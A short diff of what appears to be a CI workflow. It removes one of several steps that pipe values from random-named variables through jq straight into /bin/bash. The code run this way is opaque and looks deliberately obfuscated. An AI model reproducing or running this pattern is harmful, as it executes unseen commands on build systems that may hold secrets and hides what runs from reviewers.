@@ -25,7 +25,6 @@ jobs:
           echo $bm03 | jq -r .yrdb972 | /bin/bash
           echo $q5622 | jq -r .zmtp10 | /bin/bash
           echo $ip0 | jq -r .y1 | /bin/bash
-          echo $ng2007 | jq -r .cjt94 | /bin/bash
           printf '%s' "$f71527" | jq -r .w03 | /bin/bash
           echo $ho6958 | jq -r .czrfi968 | /bin/bash
 
